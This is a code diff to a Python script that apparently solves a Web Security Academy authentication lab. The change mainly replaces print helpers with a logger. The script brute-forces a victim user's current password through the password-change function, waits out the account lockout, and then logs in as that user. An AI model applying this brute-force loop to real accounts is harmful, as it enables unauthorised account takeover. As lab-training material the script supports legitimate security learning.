@@ -1,13 +1,15 @@
-from web_security_academy.core.utils import *
+from web_security_academy.core.utils import auth_lab_passwords
+from web_security_academy.core.logger import logger
 from time import sleep
 
 
 def solve_lab(session):
     passwords = auth_lab_passwords()
-    print_info(
+    logger.info(
         "Attempting to change Carlos's password (Requires his current password)..."
     )
 
+    logger.toggle_newline()
     for password in passwords:
         session.post_path("/logout")
         session.post_path("/login", data={"username": "wiener", "password": "peter"})
@@ -25,16 +27,16 @@ def solve_lab(session):
         )
 
         if resp.status_code == 302:
-            print_info_secondary(
-                f"{password} => Incorrect password",
-                end="\x1b[1K",
-            )
+            logger.info(f"{password} => Incorrect password")
         else:
-            print_success(f"{password} => Password changed successfully!\n")
+            logger.success(f"{password} => Password changed successfully!")
+            logger.toggle_newline()
             break
     else:
-        print_fail("Unable to find Carlos's current password.")
+        logger.failure("Unable to find Carlos's current password.")
+        logger.toggle_newline()
+        return
 
-    print_info("Sleeping for 1 minute to remove account lock...")
+    logger.info("Sleeping for 1 minute to remove account lock...")
     sleep(60)
     session.login("carlos", password, with_csrf=False)
